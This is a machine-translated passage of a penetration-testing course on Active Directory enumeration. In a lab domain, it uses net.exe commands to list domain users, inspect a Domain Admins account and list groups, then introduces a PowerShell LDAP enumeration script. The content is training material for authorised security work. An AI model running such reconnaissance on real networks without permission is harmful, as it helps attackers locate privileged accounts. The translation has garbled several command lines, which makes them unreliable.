<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:8198;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\\DC01.corp.com 的用户帐户</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:8232;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- -----------------------------</font></font></nobr></div>
<div style="position:absolute;top:8249;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">亚当    </font></font></nobr></div>
<div style="position:absolute;top:8249;left:311"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">行政人员    </font></font></nobr></div>
<div style="position:absolute;top:8249;left:514"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认帐户</font></font></nobr></div>
<div style="position:absolute;top:8266;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来宾    </font></font></nobr></div>
<div style="position:absolute;top:8266;left:311"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iis_service    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:8266;left:514"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">jeff_admin</font></font></b></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:8343;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">605 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://support.microsoft.com/en-us/help/556003</font></font></font></nobr></div>
<div style="position:absolute;top:8363;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">606 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://support.microsoft.com/en-us/help/251394/how-to-use-the-net-user-command</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:8491;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="8"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 8 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:8524;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:9601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:9601;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:9601;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">625</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:8620;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">金币    </font></font></nobr></div>
<div style="position:absolute;top:8620;left:311"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">离场    </font></font></nobr></div>
<div style="position:absolute;top:8620;left:514"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sql_service</font></font></nobr></div>
<div style="position:absolute;top:8636;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令成功完成。</font></font></nobr></div>
<div style="position:absolute;top:8656;left:319"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 662 - 运行 net user domain 命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:8685;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在生产环境中运行此命令可能会返回更长的用户列表。</font></font></nobr></div>
<div style="position:absolute;top:8705;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有了这个列表，我们现在可以查询个人用户的信息。</font></font></nobr></div>
<div style="position:absolute;top:8738;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据上面的输出，我们应该查询</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">jeff_admin</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户，因为这个名字听起来很不错</font></font></nobr></div>
<div style="position:absolute;top:8757;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有希望。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:8819;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们过去的经验表明，管理员通常倾向于添加</font></font></i></nobr></div>
<div style="position:absolute;top:8838;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名的前缀或后缀，通过其功能识别帐户。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:8902;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\Offsec.corp&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络用户 jeff_admin /domain</font></font></font></b></nobr></div>
<div style="position:absolute;top:8919;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该请求将在域 corp.com 的域控制器上进行处理。</font></font></nobr></div>
<div style="position:absolute;top:8953;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名    </font></font></nobr></div>
<div style="position:absolute;top:8953;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">jeff_admin</font></font></nobr></div>
<div style="position:absolute;top:8970;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全名    </font></font></nobr></div>
<div style="position:absolute;top:8970;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">杰夫_管理员</font></font></nobr></div>
<div style="position:absolute;top:8987;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">评论</font></font></nobr></div>
<div style="position:absolute;top:9004;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户评论</font></font></nobr></div>
<div style="position:absolute;top:9021;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">国家/地区代码    </font></font></nobr></div>
<div style="position:absolute;top:9021;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">000（系统默认）</font></font></nobr></div>
<div style="position:absolute;top:9038;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户有效    </font></font></nobr></div>
<div style="position:absolute;top:9038;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是的</font></font></nobr></div>
<div style="position:absolute;top:9055;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户过期    </font></font></nobr></div>
<div style="position:absolute;top:9055;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绝不</font></font></nobr></div>
<div style="position:absolute;top:9089;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后设置的密码    </font></font></nobr></div>
<div style="position:absolute;top:9089;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2/19/2018 下午 1:56:22</font></font></nobr></div>
<div style="position:absolute;top:9106;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码过期    </font></font></nobr></div>
<div style="position:absolute;top:9106;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绝不</font></font></nobr></div>
<div style="position:absolute;top:9123;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码可更改    </font></font></nobr></div>
<div style="position:absolute;top:9123;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2/19/2018 下午 1:56:22</font></font></nobr></div>
<div style="position:absolute;top:9140;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要求输入密码    </font></font></nobr></div>
<div style="position:absolute;top:9140;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是的</font></font></nobr></div>
<div style="position:absolute;top:9157;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户可以更改密码 是</font></font></nobr></div>
<div style="position:absolute;top:9191;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许使用工作站    </font></font></nobr></div>
<div style="position:absolute;top:9191;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全部</font></font></nobr></div>
<div style="position:absolute;top:9208;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录脚本</font></font></nobr></div>
<div style="position:absolute;top:9225;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户资料</font></font></nobr></div>
<div style="position:absolute;top:9242;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主目录</font></font></nobr></div>
<div style="position:absolute;top:9259;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上次登录    </font></font></nobr></div>
<div style="position:absolute;top:9259;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绝不</font></font></nobr></div>
<div style="position:absolute;top:9293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许登录时间    </font></font></nobr></div>
<div style="position:absolute;top:9293;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全部</font></font></nobr></div>
<div style="position:absolute;top:9327;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本地组成员资格</font></font></nobr></div>
<div style="position:absolute;top:9343;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全局组成员*域用户    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:9343;left:522"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*域管理员</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:9360;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令成功完成。</font></font></nobr></div>
<div style="position:absolute;top:9380;left:307"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 663 - 针对特定用户运行 net user</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:9409;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出表明 jeff_admin 是 Domain Admins 组的成员，因此我们将创建一个</font></font></nobr></div>
<div style="position:absolute;top:9429;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注意这一点。</font></font></nobr></div>
<div style="position:absolute;top:9461;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了枚举域中的所有组，我们可以</font><font style="vertical-align: inherit;">向</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">net 组</font></font></b><font style="vertical-align: inherit;">提供</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/domain</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b></nobr></div>
<div style="position:absolute;top:9481;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令：</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">607</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:9551;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">607 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2017），https:</font></font><font style="vertical-align: inherit;"> //technet.microsoft.com/pl-pl/library/cc754051 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=ws.10).aspx</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:9679;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="9"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 9 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:9712;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:10789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:10789;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:10789;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">626</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:9810;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\Offsec.corp&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络组/域</font></font></font></b></nobr></div>
<div style="position:absolute;top:9827;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该请求将在域 corp.com 的域控制器上进行处理。</font></font></nobr></div>
<div style="position:absolute;top:9878;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\\DC01.corp.com 的组帐户</font></font></nobr></div>
<div style="position:absolute;top:9912;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- -----------------------------</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:9928;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*Another_Nested_Group</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:9945;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*可克隆的域控制器</font></font></nobr></div>
<div style="position:absolute;top:9963;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*DnsUpdateProxy</font></font></nobr></div>
<div style="position:absolute;top:9980;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*域管理员</font></font></nobr></div>
<div style="position:absolute;top:9997;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*域计算机</font></font></nobr></div>
<div style="position:absolute;top:10013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*域控制器</font></font></nobr></div>
<div style="position:absolute;top:10030;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*域来宾</font></font></nobr></div>
<div style="position:absolute;top:10047;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*域用户</font></font></nobr></div>
<div style="position:absolute;top:10064;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*企业管理员</font></font></nobr></div>
<div style="position:absolute;top:10081;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*企业关键管理员</font></font></nobr></div>
<div style="position:absolute;top:10098;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*企业只读域控制器</font></font></nobr></div>
<div style="position:absolute;top:10115;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*组策略创建者所有者</font></font></nobr></div>
<div style="position:absolute;top:10132;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*主要管理员</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:10149;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*嵌套_组</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:10166;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*受保护的用户</font></font></nobr></div>
<div style="position:absolute;top:10183;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*只读域控制器</font></font></nobr></div>
<div style="position:absolute;top:10200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*架构管理员</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:10217;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*Secret_Group</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:10234;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令成功完成。</font></font></nobr></div>
<div style="position:absolute;top:10253;left:328"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 664 - 运行 net group 命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:10283;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从清单 664 中突出显示的输出中，我们注意到自定义组</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Secret_Group</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font></nobr></div>
<div style="position:absolute;top:10302;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nested_Group</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Another_Nested_Group</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">在 Active Directory 中，一个组（以及随后所有的</font></font></nobr></div>
<div style="position:absolute;top:10322;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含的成员）可以作为成员添加到另一个组。</font><font style="vertical-align: inherit;">这称为嵌套组。</font></font></nobr></div>
<div style="position:absolute;top:10354;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然嵌套可能看起来令人困惑，但它确实可以很好地扩展，允许灵活性和动态成员资格</font></font></nobr></div>
<div style="position:absolute;top:10374;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">甚至最大的 AD 实施的定制。</font></font></nobr></div>
<div style="position:absolute;top:10406;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不幸的是，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">net.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令行工具无法列出嵌套组，只能显示直接</font></font></nobr></div>
<div style="position:absolute;top:10426;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户成员。</font><font style="vertical-align: inherit;">鉴于此和其他限制，我们将探索更灵活的替代方案</font></font></nobr></div>
<div style="position:absolute;top:10445;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下一节在更大的现实世界环境中更有效。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:10480;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.2.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:10510;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 连接到您的 Windows 10 客户端并使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">net.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font></nobr></div>
<div style="position:absolute;top:10529;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">领域。</font><font style="vertical-align: inherit;">看看您是否可以发现任何有趣的用户或组。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:10563;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.2.2</font></font></i></nobr></div>
<div style="position:absolute;top:10563;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现代方法</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:10601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有几种更现代的工具能够枚举 AD 环境。</font><font style="vertical-align: inherit;">电源外壳</font></font></nobr></div>
<div style="position:absolute;top:10621;left:109"><nobr><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">像</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Get-ADUser </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">608</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这样的</font><i><font style="vertical-align: inherit;">cmdlet 运行</font></i><font style="vertical-align: inherit;">良好，但它们仅默认安装在域控制器上</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:10739;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">608 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/powershell/module/addsadministration/get-aduser?view=win10-ps</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:10867;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="10"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 10 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:10900;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:11977;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:11977;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:11977;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">627</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:10996;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（作为 RSAT </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">609 的</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一部分</font><font style="vertical-align: inherit;">），虽然它们可能安装在 Windows 7 的 Windows 工作站上</font></font></nobr></div>
<div style="position:absolute;top:11015;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并且，它们需要管理权限才能使用。</font></font></nobr></div>
<div style="position:absolute;top:11048;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，我们可以使用 PowerShell（Windows 的首选管理脚本语言）来</font></font></nobr></div>
<div style="position:absolute;top:11067;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">枚举 AD。</font><font style="vertical-align: inherit;">在本节中，我们将开发一个脚本来枚举 AD 用户以及</font></font></nobr></div>
<div style="position:absolute;top:11087;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些用户帐户的所有属性。</font></font></nobr></div>
<div style="position:absolute;top:11119;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然这不像运行</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">net.exe</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这样的命令那么简单</font><font style="vertical-align: inherit;">，但脚本会非常灵活，</font></font></nobr></div>
<div style="position:absolute;top:11139;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许我们根据需要添加特性和功能。</font><font style="vertical-align: inherit;">在构建脚本时，我们将讨论许多</font></font></nobr></div>
<div style="position:absolute;top:11158;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与手头任务相关的技术细节。</font><font style="vertical-align: inherit;">脚本完成后，我们可以复制并粘贴它</font></font></nobr></div>
<div style="position:absolute;top:11178;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在评估期间使用。</font></font></nobr></div>
<div style="position:absolute;top:11210;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为概述，此脚本将查询网络以获取主域控制器的名称</font></font></nobr></div>
<div style="position:absolute;top:11229;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模拟器和域，搜索 Active Directory 并过滤输出以显示用户帐户，</font></font></nobr></div>
<div style="position:absolute;top:11249;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后清理输出以提高可读性。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:11311;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主域控制器模拟器是五个操作主机角色之一</font></font></i></nobr></div>
<div style="position:absolute;top:11330;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font><font style="vertical-align: inherit;">由域控制器执行的</font><font style="vertical-align: inherit;">FSMO 角色</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">610</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">从技术上讲，该</font></font></i></nobr></div>
<div style="position:absolute;top:11350;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">属性称为 PdcRoleOwner，具有此属性的域控制器将</font></font></i></nobr></div>
<div style="position:absolute;top:11369;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">始终拥有有关用户登录和身份验证的最新信息。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:11431;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此脚本依赖于一些组件。</font><font style="vertical-align: inherit;">具体来说，我们将使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DirectorySearcher </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">611</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象来</font></font></nobr></div>
<div style="position:absolute;top:11450;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">轻量级目录访问协议</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(LDAP)</font><font style="vertical-align: inherit;">查询 Active Directory </font><font style="vertical-align: inherit;">，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">612</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个网络</font></font></nobr></div>
<div style="position:absolute;top:11470;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域控制器理解的协议也用于与第三方通信</font></font></nobr></div>
<div style="position:absolute;top:11489;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序。</font></font></nobr></div>
<div style="position:absolute;top:11522;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LDAP 是一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Active Directory 服务接口</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(ADSI) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">613</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提供程序（本质上是一个 API），它支持</font></font></nobr></div>
<div style="position:absolute;top:11541;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">针对 Active Directory 的搜索功能。</font><font style="vertical-align: inherit;">这将允许我们与域进行交互</font></font></nobr></div>
<div style="position:absolute;top:11561;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制器使用 PowerShell 并提取有关域中对象的非特权信息。</font></font></nobr></div>
